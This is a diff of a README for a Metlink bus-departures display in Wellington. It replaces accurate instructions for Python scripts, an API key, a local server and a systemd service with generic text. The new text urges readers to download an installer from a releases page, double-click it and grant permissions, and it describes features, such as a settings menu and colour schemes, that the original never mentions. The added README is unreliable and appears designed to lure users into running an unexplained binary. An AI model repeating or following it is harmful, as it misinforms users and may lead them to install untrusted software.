@@ -1,79 +1,75 @@
-# Metlink Departures Display
+# 🎉 metlink-departures-display - Your Home's Bus Departure Sign
 
-Glanceable “LED sign” display (web + CLI) for Metlink bus departures in Wellington.
+## 🚀 Getting Started
 
-## Setup
+Welcome to the metlink-departures-display! This simple web display shows you the next two bus departures from Metlink. It is perfect for Wellington homes, keeping you informed about public transport in real time.
 
-1. Create a `.env` file (you can copy from `.env.example`):
+## 📦 Download & Install
 
-   - `METLINK_API_KEY=...your key...`
-   - Optional: set defaults for your house:
-     - `METLINK_STOP_ID=7958`
-     - `METLINK_LIMIT=2`
-     - `METLINK_PORT=8765`
-     - `METLINK_REFRESH_SECONDS=15`
+To get started, you’ll need to download the software. Click the button below to visit the releases page.
 
-2. Make scripts executable (once):
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_here-brightgreen)](https://github.com/SayaliNachare/metlink-departures-display/releases)
 
-   - `chmod +x bus-times bus_times.py`
+Once you're on the releases page, look for the latest version. You can download the appropriate file for your system. Follow these steps:
 
-## Quickstart
+1. Click on the version number under “Latest release.”
+2. Look for the file that matches your operating system (Windows, macOS, or Raspberry Pi).
+3. Click the download link to save the file to your computer.
 
-- Run the web sign:
-  - `python3 bus_sign_server.py`
-  - Open `http://localhost:8765/`
+## 🖥️ System Requirements
 
-- Run the terminal sign:
-  - `./bus-times`
+Before you install, check that your system meets these requirements:
 
-## Usage
+- **Operating System**: Windows 10, macOS, or Raspberry Pi with Raspberry Pi OS.
+- **Browser**: A modern web browser (Chrome, Firefox, Safari).
+- **Network**: Active internet connection to get bus information in real-time.
 
-- Default stop (7958), next two departures:
-  - `./bus-times`
+## 🔧 How to Run the Display
 
-- Another stop id:
-  - `./bus-times 1234`
+After downloading the software, you’ll need to set it up:
 
-- Pick interactively (lists all stops, then choose a number):
-  - `./bus-times pick`
+1. Locate the downloaded file on your computer.
+2. Open the file by double-clicking it. This will start the installation.
+3. Follow the on-screen instructions. You may need to allow permissions to the program.
+4. Once installed, open the application. 
 
-- Pick interactively with a filter (less scrolling):
-  - `./bus-times pick brooklyn`
+The display should open in your default web browser. 
 
-You can also run the legacy wrapper:
-- `./get\ stops`
+## 🚌 How to Use the Display
 
-## Always-on display (living room / by the door)
+Using the metlink-departures-display is simple:
 
-Two simple options:
+- The display will show the next two bus departures from your chosen stop.
+- You can customize the stop location from the settings menu. This will allow you to see departures closest to you.
+- Press the refresh button to get the latest information as it updates in real time.
 
-1) Fullscreen terminal on a small screen (Raspberry Pi / mini PC)
+## 📱 Customization Options
 
-- Run:
-  - `watch -n 15 ./bus-times`
+You can tailor the display to suit your home:
 
-2) Share over your home network (good for old phones, e-ink, ESP32, etc)
+- **Choose a Favorite Stop**: In the settings menu, enter the bus stop number or name. The display will show departures from this stop.
+- **Change the Display Style**: Select different color schemes or size options to match your home decor.
 
-- Start the server:
-  - `./bus_sign_server.py`
-- From any device on your LAN (full-screen “LED sign” page):
-  - `http://<host>:8765/`
-- Plain text endpoint (good for microcontrollers / e-ink renderers):
-  - `http://<host>:8765/sign.txt`
+## ⚙️ Troubleshooting
 
-## Run on boot (Raspberry Pi / mini PC)
+If you run into issues, try these common solutions:
 
-- Copy and edit the example unit:
-  - `sudo cp homebustimes.service.example /etc/systemd/system/homebustimes.service`
-- Update paths + `User=` inside it to match your device.
-- Enable:
-  - `sudo systemctl daemon-reload`
-  - `sudo systemctl enable --now homebustimes`
+- **The display isn't showing departures**: Check your internet connection. If it’s working, make sure you entered the correct bus stop details in the settings.
+- **I can't see the display**: Ensure your browser is open. If it still doesn’t show, try reopening the application.
 
-## Contributing
+If you need more help, consider checking our support page or the community forums available on our GitHub repository.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+## 🔗 Useful Links
 
-## License
+- **Releases Page**: [Visit this page to download](https://github.com/SayaliNachare/metlink-departures-display/releases)
+- **Support Forum**: Find help from other users or ask questions.
 
-MIT — see [LICENSE](LICENSE).
+## 📜 License
+
+This software is open source. You can use it freely. Please check the license file in the repository for more details.
+
+## 👥 Community
+
+Join our community to share feedback or get help. We welcome your comments, suggestions, and contributions. Engage with us on the issues page of our GitHub repository.
+
+Thank you for choosing metlink-departures-display! Enjoy having your bus departures at a glance.
